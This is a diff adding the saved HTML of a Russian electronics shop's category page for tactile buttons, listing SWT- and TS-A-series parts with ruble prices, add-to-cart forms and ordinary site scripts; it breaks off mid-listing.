@@ -1,0 +1,1185 @@
+<html dir="ltr">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<base href="http://4.interia2.z8.ru/">
+	<script type="text/javascript">
+		var WAROOT_URL = 'http://4.interia2.z8.ru/';//ok
+	</script>
+	
+<!-- Head start -->
+<title>Кнопки тактовые</title>
+<meta name="description" content="Кнопки тактовые">
+<meta name="keywords" content="Кнопки тактовые" >
+
+<script type="text/javascript" src="/published/SC/html/scripts/js/niftycube.js"></script>
+<!-- Head end -->
+
+	<link rel="stylesheet" href="/published/SC/html/scripts/repo_themes/modern/overridestyles.css" type="text/css">	<script type="text/javascript" src="/published/SC/html/scripts/repo_themes/modern/head.js"></script>
+	<link rel="stylesheet" href="/published/SC/html/scripts/repo_themes/modern/main.css" type="text/css">
+	<link rel="stylesheet" href="/published/SC/html/scripts/css/general.css" type="text/css">
+	<script type="text/javascript" src="/published/SC/html/scripts/js/functions.js"></script>
+	<script type="text/javascript" src="/published/SC/html/scripts/js/behavior.js"></script>
+	<script type="text/javascript" src="/published/SC/html/scripts/js/widget_checkout.js"></script>
+	<script type="text/javascript" src="/published/SC/html/scripts/js/frame.js"></script>
+	<script type="text/javascript">
+<!--		
+
+var defaultCurrency = {
+	display_template: '{value} руб.',
+	decimal_places: '2',
+	decimal_symbol: '.',
+	thousands_delimiter: '',
+	getView: function (price){return this.display_template.replace(/\{value\}/, number_format(price, this.decimal_places, this.decimal_symbol, this.thousands_delimiter));}
+	};
+
+var ORIG_URL = 'http://4.interia2.z8.ru/';
+var ORIG_LANG_URL = '/index.php';
+window.currDispTemplate = defaultCurrency.display_template;
+var translate = {};
+translate.cnfrm_unsubscribe = 'Вы уверены, что хотите удалить вашу учетную запись в магазине?';
+translate.err_input_email = 'Введите правильный электронный адрес';
+translate.err_input_nickname = 'Пожалуйста, введите Ваш псевдоним';
+translate.err_input_message_subject = 'Пожалуйста, введите тему сообщения';
+translate.err_input_price = 'Цена должна быть положительным числом';
+function position_this_window(){
+	var x = (screen.availWidth - 600) / 2;
+	window.resizeTo(600, screen.availHeight - 100);
+	window.moveTo(Math.floor(x),50);
+}		
+//-->
+</script>
+	</head>
+	<body >
+<!--  BODY -->
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+  <tr>
+    <td id="container_top_left">
+           <!-- cpt_container_start -->
+<div class="cpt_logo"><a href="/index.php?ukey=home"><img src="/published/publicdata/DBINTERIA23/attachments/SC/images/mdr_companyname.gif" alt="Магазин электронных компонентов" /></a></div>
+
+<div class="cpt_custom_html"><a href="/"><span class="mdr_l1">Your</span><span class="mdr_l2">Company</span><span class="mdr_l3">Name</span></a></div>
+<!-- cpt_container_end -->
+    </td>
+    <td id="container_top"> 
+          <!-- cpt_container_start --><!-- cpt_container_end -->
+             
+            <!-- cpt_container_start -->
+<div class="cpt_divisions_navigation"><ul class="vertical"><li><a href="/index.php?ukey=home">Главная страница</a></li><li><a href="/index.php?ukey=register">Зарегистрироваться</a></li><li><a href="/index.php?ukey=auth">Вход с паролем</a></li><li><a href="/index.php?ukey=pricelist">Прайс-лист</a></li><li><a href="/index.php?ukey=feedback">Обратная связь</a></li></ul></div>
+
+<div class="cpt_language_selection"></div>
+<!-- cpt_container_end -->
+          
+    </td>
+    <td id="container_top_right"> 
+           <!-- cpt_container_start -->
+<div class="cpt_currency_selection"><span class="light">Валюта:</span>
+<form action="/index.php?categoryID=769" method="post" name="ChangeCurrencyForm">
+	
+	<script language='JavaScript' type="text/javascript">
+		function _changeCurrency(){
+			document.ChangeCurrencyForm.submit();
+		}
+	</script>
+	
+	<select name='current_currency' onchange='_changeCurrency()'>
+				<option value='3'	 selected="selected">
+			Рубли
+		</option>
+			</select>
+</form></div>
+
+<div class="cpt_auxpages_navigation"><ul class="vertical"><li><a href="/index.php?ukey=auxpage_1">О магазине</a></li><li><a href="/index.php?ukey=auxpage_shema-proezda">Контакты</a></li></ul></div>
+<!-- cpt_container_end -->
+    </td>
+  </tr>
+  <tr> 
+    <td id="container_left_sidebar"><!-- cpt_container_start -->
+<div class="cpt_custom_html"><div class="col_header">Каталог</div></div>
+
+<div class="cpt_category_tree"><ul>
+      <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=776'>Батарейные отсеки</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=767'>Выключатели 220В</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=762'>Джампер</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=754'>Кабель</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=764'>Клеммники</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=777'>Клеммы на провод</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=770'>Кнопки мини</a>
+</li>
+    <li class="parent_current">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=769'>Кнопки тактовые</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=757'>Микропереключатели</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=741'>Панельки для микросхем</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=759'>Переключатели DIP</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=756'>Переключатели сдвиговые</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=763'>Переходники (адаптеры)</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=765'>Платформы на DIN-рельс</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=755'>Предохранители и держатели предохранитлей</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=722'>Разъемы</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=761'>Слоты</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=781'>Стойки для печатных плат</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=775'>Стяжки открываемые</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=766'>Тумблеры</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=774'>Устройства</a>
+</li>
+    <li class="parent">
+<span class="bullet">&nbsp;</span><a href='/index.php?categoryID=773'>Фурнитура</a>
+</li>
+  </ul></div>
+
+<div class="cpt_custom_html"><div class="col_header green">Поиск</div></div>
+
+<div class="cpt_product_search"><form action="/index.php?ukey=search" method="post">
+<input type="text" id="searchstring" name="searchstring" value='Поиск товаров' rel="Поиск товаров" class="input_message" />
+<input type="submit" value="Найти" />
+</form></div>
+
+<div class="cpt_tag_cloud"></div>
+<!-- cpt_container_end --></td>
+    <td id="container_main_content"><!-- cpt_container_start -->
+<div class="cpt_maincontent"><script type="text/javascript" src="/published/SC/html/scripts/js/category.js"></script>
+<div class="clearfix" id="cat_path">
+<table cellpadding="0" border="0" class="cat_path_in_productpage">
+	<tr>
+		<td><a href="/index.php">Главная</a> &raquo;
+										<a href='/index.php?categoryID=769'>Кнопки тактовые</a>					</td>
+	</tr>
+	</table>
+	</div>
+	<div class="clearfix" id="cat_top_tree">
+				<div id="cat_advproduct_search">
+	<h3>
+			Поиск продукта в этой категории
+		</h3>
+	
+	<form name='AdvancedSearchInCategory' method='get' action='/index.php?ukey=category_search'>
+
+		
+		<input name='ukey' value='category_search' type="hidden" />
+		
+			<input type='hidden' name='search_with_change_category_ability' value='1' />
+		<input name='categoryID' value='769' type="hidden" />
+		
+	<table>
+			<tr>
+		<td>Название</td>
+		<td><input type="text" name="search_name" value="" size="16" /></td>
+	</tr>
+	<tr> 
+		<td valign="bottom">Цена</td>
+		<td nowrap="nowrap">
+			<table cellpadding="0" cellspacing="0">
+			<tr>
+				<td>от</td>
+				<td>до</td>
+			</tr>
+			<tr>
+				<td><input name="search_price_from" type="text" size="7" value="" />&nbsp;</td>
+				<td><input name="search_price_to" type="text" size="7" value="" /></td>
+			</tr>
+			</table>
+		</td>
+	</tr>
+		
+		
+		<tr>
+		<td colspan='2'>
+			<input type='hidden' value='1' name='search_in_subcategory' />
+					</td>
+	</tr>
+			<tr>
+		<td colspan="2"><input type='submit' value='Найти' name='advanced_search_in_category' /></td>
+	</tr>
+		</table>
+	
+	</form>
+</div>				
+		<div id="cat_info_left_block">
+				
+				</div>
+
+</div>
+
+<center>
+
+<form action='/index.php?categoryID=769&ukey=product_comparison' method="post">
+	<input type="hidden" value='' class="comparison_products" name='comparison_products' />
+	<input value='Сравнить выбранные продукты' class="hndl_submit_prds_cmp" onclick='submitProductsComparison();' type="button" />
+</form>
+
+
+<p id="cat_product_sort">Сортировать по: наименованию (<a href='/index.php?categoryID=769&amp;sort=name&amp;direction=ASC'>возр</a> | <a href='/index.php?categoryID=769&amp;sort=name&amp;direction=DESC'>убыв</a>), цене (<a href='/index.php?categoryID=769&amp;sort=Price&amp;direction=ASC'>возр</a> | <a href='/index.php?categoryID=769&amp;sort=Price&amp;direction=DESC'>убыв</a>), рейтингу (<a href='/index.php?categoryID=769&amp;sort=customers_rating&amp;direction=ASC'>возр</a> | <a href='/index.php?categoryID=769&amp;sort=customers_rating&amp;direction=DESC'>убыв</a>)</p>
+
+<p><a class=no_underline href="/index.php?categoryID=769&amp;offset=0">1</a> &nbsp;&nbsp;<a class=no_underline href="/index.php?categoryID=769&amp;offset=12">2</a> &nbsp;&nbsp;<a class=no_underline href="/index.php?categoryID=769&amp;offset=24">3</a> &nbsp;&nbsp; |&nbsp; <B>показать все</B></p>	
+<table cellpadding="6" width="95%">
+  	<tr>	<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57267" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57267" type="hidden" />
+	<input class="product_price" value="2.74" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57267'>1212D (SWT-12x12x12)</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.74 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57267" class="checknomarging ctrl_products_cmp" type="checkbox" value='57267' />
+		<label for="ctrl-prd-cmp-57267">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57256" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57256" type="hidden" />
+	<input class="product_price" value="2.46" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57256'>SWT-1 (DTS-32)</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.46 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57256" class="checknomarging ctrl_products_cmp" type="checkbox" value='57256' />
+		<label for="ctrl-prd-cmp-57256">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57264" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57264" type="hidden" />
+	<input class="product_price" value="1.23" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57264'>SWT-16</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">1.23 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57264" class="checknomarging ctrl_products_cmp" type="checkbox" value='57264' />
+		<label for="ctrl-prd-cmp-57264">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57257" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57257" type="hidden" />
+	<input class="product_price" value="2.46" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57257'>SWT-1A</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.46 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57257" class="checknomarging ctrl_products_cmp" type="checkbox" value='57257' />
+		<label for="ctrl-prd-cmp-57257">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	</tr>  	<tr>	<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57265" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57265" type="hidden" />
+	<input class="product_price" value="6.14" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57265'>SWT-30</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">6.14 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57265" class="checknomarging ctrl_products_cmp" type="checkbox" value='57265' />
+		<label for="ctrl-prd-cmp-57265">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57266" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57266" type="hidden" />
+	<input class="product_price" value="2.46" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57266'>SWT-32 (=DTSGL-61K)</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.46 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57266" class="checknomarging ctrl_products_cmp" type="checkbox" value='57266' />
+		<label for="ctrl-prd-cmp-57266">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57258" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57258" type="hidden" />
+	<input class="product_price" value="3.28" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57258'>SWT-5</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">3.28 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57258" class="checknomarging ctrl_products_cmp" type="checkbox" value='57258' />
+		<label for="ctrl-prd-cmp-57258">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57259" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57259" type="hidden" />
+	<input class="product_price" value="3.52" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57259'>SWT-5-SMD</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">3.52 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57259" class="checknomarging ctrl_products_cmp" type="checkbox" value='57259' />
+		<label for="ctrl-prd-cmp-57259">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	</tr>  	<tr>	<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57260" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57260" type="hidden" />
+	<input class="product_price" value="1.64" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57260'>SWT-6x6x8</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">1.64 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57260" class="checknomarging ctrl_products_cmp" type="checkbox" value='57260' />
+		<label for="ctrl-prd-cmp-57260">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57261" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57261" type="hidden" />
+	<input class="product_price" value="3.69" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57261'>SWT-9 (DTS-24N)</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">3.69 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57261" class="checknomarging ctrl_products_cmp" type="checkbox" value='57261' />
+		<label for="ctrl-prd-cmp-57261">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57263" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57263" type="hidden" />
+	<input class="product_price" value="0.9" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57263'>SWT-9RG</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">0.90 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57263" class="checknomarging ctrl_products_cmp" type="checkbox" value='57263' />
+		<label for="ctrl-prd-cmp-57263">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57262" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57262" type="hidden" />
+	<input class="product_price" value="0.9" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57262'>SWT-9RR</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">0.90 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57262" class="checknomarging ctrl_products_cmp" type="checkbox" value='57262' />
+		<label for="ctrl-prd-cmp-57262">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	</tr>  	<tr>	<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57243" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57243" type="hidden" />
+	<input class="product_price" value="1.23" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57243'>TS-A1PS-130 (SWT-2)</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">1.23 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57243" class="checknomarging ctrl_products_cmp" type="checkbox" value='57243' />
+		<label for="ctrl-prd-cmp-57243">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57248" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57248" type="hidden" />
+	<input class="product_price" value="2.46" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57248'>TS-A1PS-130-SMD</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.46 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57248" class="checknomarging ctrl_products_cmp" type="checkbox" value='57248' />
+		<label for="ctrl-prd-cmp-57248">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57251" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57251" type="hidden" />
+	<input class="product_price" value="2.05" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57251'>TS-A1PV-130 (SWT-7)</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.05 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57251" class="checknomarging ctrl_products_cmp" type="checkbox" value='57251' />
+		<label for="ctrl-prd-cmp-57251">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57244" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57244" type="hidden" />
+	<input class="product_price" value="1.23" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57244'>TS-A2PS-130</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">1.23 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57244" class="checknomarging ctrl_products_cmp" type="checkbox" value='57244' />
+		<label for="ctrl-prd-cmp-57244">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	</tr>  	<tr>	<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57252" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57252" type="hidden" />
+	<input class="product_price" value="2.05" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57252'>TS-A2PV-130</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.05 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57252" class="checknomarging ctrl_products_cmp" type="checkbox" value='57252' />
+		<label for="ctrl-prd-cmp-57252">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57241" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57241" type="hidden" />
+	<input class="product_price" value="1.64" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57241'>TS-A3PG-130</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">1.64 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57241" class="checknomarging ctrl_products_cmp" type="checkbox" value='57241' />
+		<label for="ctrl-prd-cmp-57241">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57245" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57245" type="hidden" />
+	<input class="product_price" value="1.23" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57245'>TS-A3PS-130 (SWT-6)</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">1.23 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57245" class="checknomarging ctrl_products_cmp" type="checkbox" value='57245' />
+		<label for="ctrl-prd-cmp-57245">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
